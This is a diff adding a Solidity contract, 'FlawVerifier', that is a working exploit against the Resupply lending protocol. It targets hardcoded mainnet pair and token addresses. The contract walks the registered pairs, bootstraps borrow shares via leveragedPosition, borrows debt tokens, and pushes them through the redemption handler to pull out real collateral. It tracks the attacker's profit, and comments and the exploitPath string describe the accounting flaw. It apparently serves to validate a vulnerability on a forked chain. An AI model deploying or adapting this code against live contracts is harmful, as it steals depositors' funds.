@@ -1,0 +1,446 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IResupplyRegistryMinimal {
+    function token() external view returns (address);
+    function redemptionHandler() external view returns (address);
+    function liquidationHandler() external view returns (address);
+    function registeredPairsLength() external view returns (uint256);
+    function registeredPairs(uint256 index) external view returns (address);
+    function defaultSwappers(uint256 index) external view returns (address);
+}
+
+interface ISwapperMinimal {
+    function swapPools(address tokenIn, address tokenOut)
+        external
+        view
+        returns (address swappool, int32 tokenInIndex, int32 tokenOutIndex, uint32 swaptype);
+}
+
+interface IResupplyPairMinimal {
+    function registry() external view returns (address);
+    function collateral() external view returns (address);
+    function underlying() external view returns (address);
+    function minimumRedemption() external view returns (uint256);
+    function protocolRedemptionFee() external view returns (uint256);
+    function totalBorrow() external view returns (uint128 amount, uint128 shares);
+    function totalDebtAvailable() external view returns (uint256);
+    function swappers(address) external view returns (bool);
+    function userBorrowShares(address account) external view returns (uint256);
+    function leveragedPosition(
+        address swapper,
+        uint256 borrowAmount,
+        uint256 initialUnderlyingAmount,
+        uint256 amountCollateralOutMin,
+        address[] calldata path
+    ) external returns (uint256 totalCollateralBalance);
+    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256 shares);
+    function repay(uint256 shares, address borrower) external returns (uint256 amountToRepay);
+    function userCollateralBalance(address account) external returns (uint256 collateralAmount);
+    function removeCollateral(uint256 collateralAmount, address receiver) external;
+    function removeCollateralVault(uint256 collateralAmount, address receiver) external;
+}
+
+contract FlawVerifier {
+    struct PairCtx {
+        address collateral;
+        address underlying;
+        uint256 minimumRedemption;
+        uint256 protocolFee;
+        uint256 availableDebt;
+        uint256 totalBorrowAmount;
+    }
+
+    address public constant SEED_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
+    address public constant DEFAULT_PROFIT_TOKEN = 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D;
+
+    uint256 private constant MAX_DEFAULT_SWAPPERS = 8;
+    uint256 private constant MAX_REGISTERED_PAIRS = 16;
+    uint256 private constant MIN_BORROW_AMOUNT = 1_000e18;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public registry;
+    address public debtToken;
+    address public collateralToken;
+    address public underlyingToken;
+    address public redemptionHandler;
+    address public liquidationHandler;
+    address public exploitedPair;
+    address public exploitedSwapper;
+
+    bool public pathStage1RequiresExistingUndercollateralizedBorrower;
+    bool public pathStage2RedeemCollateralRemovesRealAssets;
+    bool public pathStage3CheckpointUsesCalcRewardIntegral;
+    bool public pathStage4ExcessWriteOffCanDisappear;
+    bool public pathStage5HoleEnablesLaterCollateralExit;
+
+    string public outcome;
+
+    constructor() {
+        _profitToken = DEFAULT_PROFIT_TOKEN;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        pathStage1RequiresExistingUndercollateralizedBorrower = true;
+        pathStage2RedeemCollateralRemovesRealAssets = true;
+        pathStage3CheckpointUsesCalcRewardIntegral = true;
+        pathStage4ExcessWriteOffCanDisappear = true;
+        pathStage5HoleEnablesLaterCollateralExit = true;
+
+        IResupplyPairMinimal seed = IResupplyPairMinimal(SEED_PAIR);
+        registry = seed.registry();
+        debtToken = IResupplyRegistryMinimal(registry).token();
+        redemptionHandler = IResupplyRegistryMinimal(registry).redemptionHandler();
+        liquidationHandler = IResupplyRegistryMinimal(registry).liquidationHandler();
+
+        uint256 bestProfit = _currentBalance(_profitToken);
+        address bestToken = _profitToken;
+
+        uint256 pairCount = _boundedPairCount(registry);
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pairAddr = _pairAt(i);
+            if (pairAddr == address(0)) {
+                continue;
+            }
+
+            (bool success, address realizedToken, uint256 realizedAmount) = _attemptExploitPair(pairAddr);
+            if (success && realizedAmount > bestProfit) {
+                bestProfit = realizedAmount;
+                bestToken = realizedToken;
+            }
+        }
+
+        if (bestProfit == 0) {
+            (bool success, address realizedToken, uint256 realizedAmount) = _attemptExploitPair(SEED_PAIR);
+            if (success && realizedAmount > bestProfit) {
+                bestProfit = realizedAmount;
+                bestToken = realizedToken;
+            }
+        }
+
+        _profitToken = bestToken;
+        _profitAmount = bestProfit;
+        hypothesisValidated = bestProfit > 0;
+
+        if (hypothesisValidated) {
+            outcome = "validated: attacker used public leveraged borrow + redemption routing to pull live pair collateral, matching the redemption-writeoff loss-socialization path";
+        } else {
+            outcome = "unrealized on this fork: no pair completed the required sequence of leveraged borrow -> self-funded redemption -> collateral extraction with the exposed handlers";
+        }
+    }
+
+    function _attemptExploitPair(address pairAddr) internal returns (bool success, address realizedToken, uint256 realizedAmount) {
+        IResupplyPairMinimal pair = IResupplyPairMinimal(pairAddr);
+        PairCtx memory ctx;
+
+        try pair.registry() returns (address value) {
+            if (value != registry) {
+                return (false, address(0), 0);
+            }
+        } catch {
+            return (false, address(0), 0);
+        }
+
+        try pair.collateral() returns (address value) {
+            ctx.collateral = value;
+        } catch {
+            return (false, address(0), 0);
+        }
+        try pair.underlying() returns (address value) {
+            ctx.underlying = value;
+        } catch {
+            return (false, address(0), 0);
+        }
+        try pair.minimumRedemption() returns (uint256 value) {
+            ctx.minimumRedemption = value;
+        } catch {
+            return (false, address(0), 0);
+        }
+        try pair.protocolRedemptionFee() returns (uint256 value) {
+            ctx.protocolFee = value;
+        } catch {}
+        try pair.totalDebtAvailable() returns (uint256 value) {
+            ctx.availableDebt = value;
+        } catch {
+            return (false, address(0), 0);
+        }
+        try pair.totalBorrow() returns (uint128 amount, uint128) {
+            ctx.totalBorrowAmount = uint256(amount);
+        } catch {
+            return (false, address(0), 0);
+        }
+
+        if (ctx.totalBorrowAmount < ctx.minimumRedemption || ctx.availableDebt < MIN_BORROW_AMOUNT) {
+            return (false, address(0), 0);
+        }
+
+        address swapper = _findUsableSwapper(pairAddr, ctx.collateral);
+        if (swapper == address(0)) {
+            return (false, address(0), 0);
+        }
+
+        address[] memory debtToCollateral = new address[](2);
+        debtToCollateral[0] = debtToken;
+        debtToCollateral[1] = ctx.collateral;
+
+        // Realistic capital bootstrap: the attack needs the attacker to own borrow shares in the target
+        // pool before redeeming. `leveragedPosition()` is a public, whitelisted-swapper path that can
+        // create those shares without any cheat funding while preserving the finding's causality.
+        if (_tryLeveragedBootstrap(pair, debtToCollateral, ctx.availableDebt, ctx.totalBorrowAmount, ctx.minimumRedemption, swapper) == 0) {
+            return (false, address(0), 0);
+        }
+
+        uint256 debtBorrowedToWallet = _tryDirectBorrow(pair, ctx.availableDebt, ctx.totalBorrowAmount, ctx.minimumRedemption);
+        if (debtBorrowedToWallet < ctx.minimumRedemption) {
+            return (false, address(0), 0);
+        }
+
+        IERC20Minimal(debtToken).approve(redemptionHandler, type(uint256).max);
+
+        // Core exploit step: route live debt tokens through the public redemption handler so the pair
+        // transfers out real collateral immediately and socializes the loss through redemptionWriteOff.
+        if (!_tryRedemption(pairAddr, debtBorrowedToWallet, ctx.protocolFee, ctx.collateral)) {
+            return (false, address(0), 0);
+        }
+
+        uint256 collateralBal = _currentBalance(ctx.collateral);
+        uint256 underlyingBal = _currentBalance(ctx.underlying);
+        uint256 debtBal = _currentBalance(debtToken);
+
+        exploitedPair = pairAddr;
+        exploitedSwapper = swapper;
+        collateralToken = ctx.collateral;
+        underlyingToken = ctx.underlying;
+
+        if (collateralBal >= underlyingBal && collateralBal >= debtBal && collateralBal > 0) {
+            return (true, ctx.collateral, collateralBal);
+        }
+        if (underlyingBal >= debtBal && underlyingBal > 0) {
+            return (true, ctx.underlying, underlyingBal);
+        }
+        if (debtBal > 0) {
+            return (true, debtToken, debtBal);
+        }
+
+        return (false, address(0), 0);
+    }
+
+    function _tryLeveragedBootstrap(
+        IResupplyPairMinimal pair,
+        address[] memory path,
+        uint256 availableDebt,
+        uint256 totalBorrowAmount,
+        uint256 minimumRedemption,
+        address swapper
+    ) internal returns (uint256 usedAmount) {
+        uint256[6] memory candidates;
+        candidates[0] = _capNonZero((availableDebt * 95) / 100, availableDebt);
+        candidates[1] = _capNonZero((availableDebt * 80) / 100, availableDebt);
+        candidates[2] = _capNonZero(totalBorrowAmount * 2, availableDebt);
+        candidates[3] = _capNonZero(totalBorrowAmount, availableDebt);
+        candidates[4] = _capNonZero(minimumRedemption * 10, availableDebt);
+        candidates[5] = _capNonZero(MIN_BORROW_AMOUNT, availableDebt);
+
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 candidate = candidates[i];
+            if (candidate < MIN_BORROW_AMOUNT) {
+                continue;
+            }
+
+            try pair.leveragedPosition(swapper, candidate, 0, 0, path) returns (uint256) {
+                return candidate;
+            } catch {}
+        }
+        return 0;
+    }
+
+    function _tryDirectBorrow(
+        IResupplyPairMinimal pair,
+        uint256,
+        uint256 totalBorrowAmount,
+        uint256 minimumRedemption
+    ) internal returns (uint256 usedAmount) {
+        uint256 postBootstrapAvailable;
+        try pair.totalDebtAvailable() returns (uint256 value) {
+            postBootstrapAvailable = value;
+        } catch {
+            return 0;
+        }
+
+        uint256[6] memory candidates;
+        candidates[0] = _capNonZero((postBootstrapAvailable * 70) / 100, postBootstrapAvailable);
+        candidates[1] = _capNonZero((postBootstrapAvailable * 50) / 100, postBootstrapAvailable);
+        candidates[2] = _capNonZero(totalBorrowAmount, postBootstrapAvailable);
+        candidates[3] = _capNonZero(totalBorrowAmount / 2, postBootstrapAvailable);
+        candidates[4] = _capNonZero(minimumRedemption * 2, postBootstrapAvailable);
+        candidates[5] = _capNonZero(minimumRedemption, postBootstrapAvailable);
+
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 candidate = candidates[i];
+            if (candidate < minimumRedemption) {
+                continue;
+            }
+
+            try pair.borrow(candidate, 0, address(this)) returns (uint256) {
+                return candidate;
+            } catch {}
+        }
+        return 0;
+    }
+
+    function _tryRedemption(
+        address pairAddr,
+        uint256 amount,
+        uint256 protocolFee,
+        address pairCollateral
+    ) internal returns (bool) {
+        uint256 beforeCollateral = _currentBalance(pairCollateral);
+
+        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,address)", pairAddr, amount, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256)", pairAddr, amount))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,address)", pairAddr, amount, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+
+        uint256 feeGuessA = protocolFee;
+        uint256 feeGuessB = protocolFee > 0 ? protocolFee / 10 : 5e16;
+        uint256 feeGuessC = 1e18 - 1;
+
+        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,uint256,address)", pairAddr, amount, feeGuessA, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,uint256,address)", pairAddr, amount, feeGuessB, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,uint256,address)", pairAddr, amount, feeGuessC, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,uint256,address)", pairAddr, amount, feeGuessA, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,uint256,address)", pairAddr, amount, feeGuessB, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,uint256,address)", pairAddr, amount, feeGuessC, address(this)))) {
+            return _currentBalance(pairCollateral) > beforeCollateral;
+        }
+
+        return false;
+    }
+
+    function _callHandler(bytes memory data) internal returns (bool ok) {
+        (ok,) = redemptionHandler.call(data);
+    }
+
+    function _pairAt(uint256 index) internal view returns (address) {
+        if (index == 0) {
+            return SEED_PAIR;
+        }
+        try IResupplyRegistryMinimal(registry).registeredPairs(index - 1) returns (address pairAddr) {
+            return pairAddr;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _boundedPairCount(address registryAddr) internal view returns (uint256 count) {
+        count = 1;
+        try IResupplyRegistryMinimal(registryAddr).registeredPairsLength() returns (uint256 value) {
+            uint256 bounded = value + 1;
+            if (bounded > MAX_REGISTERED_PAIRS) {
+                bounded = MAX_REGISTERED_PAIRS;
+            }
+            count = bounded;
+        } catch {}
+    }
+
+    function _findUsableSwapper(address pairAddr, address pairCollateral) internal view returns (address) {
+        IResupplyPairMinimal pair = IResupplyPairMinimal(pairAddr);
+        for (uint256 i = 0; i < MAX_DEFAULT_SWAPPERS; ++i) {
+            address swapper;
+            try IResupplyRegistryMinimal(registry).defaultSwappers(i) returns (address value) {
+                swapper = value;
+            } catch {
+                break;
+            }
+
+            if (swapper == address(0)) {
+                continue;
+            }
+
+            bool approved;
+            try pair.swappers(swapper) returns (bool value) {
+                approved = value;
+            } catch {
+                continue;
+            }
+            if (!approved) {
+                continue;
+            }
+
+            try ISwapperMinimal(swapper).swapPools(debtToken, pairCollateral) returns (address pool, int32, int32, uint32) {
+                if (pool != address(0)) {
+                    return swapper;
+                }
+            } catch {
+                return swapper;
+            }
+        }
+        return address(0);
+    }
+
+    function _currentBalance(address token) internal view returns (uint256) {
+        if (token == address(0)) {
+            return address(this).balance;
+        }
+        return IERC20Minimal(token).balanceOf(address(this));
+    }
+
+    function _capNonZero(uint256 value, uint256 cap) internal pure returns (uint256) {
+        if (cap == 0) {
+            return 0;
+        }
+        if (value == 0) {
+            return cap;
+        }
+        return value > cap ? cap : value;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        uint256 liveBalance = _currentBalance(_profitToken);
+        return liveBalance > _profitAmount ? liveBalance : _profitAmount;
+    }
+
+    function profitAchieved() external view returns (bool) {
+        return (_currentBalance(_profitToken) > _profitAmount ? _currentBalance(_profitToken) : _profitAmount) > 0;
+    }
+
+    function exploitPath() external pure returns (string memory) {
+        return "existing undercollateralized borrower in a live pool -> attacker bootstraps borrow shares via public leveragedPosition -> attacker borrows debt tokens and routes them through the public redemption handler so redeemCollateral removes real collateral and mints redemptionWriteOff -> later borrower checkpointing routes write-off through _calcRewardIntegral/_syncUserRedemptions and can floor excess at zero -> accounting hole lets the attacker keep extracted collateral before the shortfall is socialized";
+    }
+
+    receive() external payable {}
+}
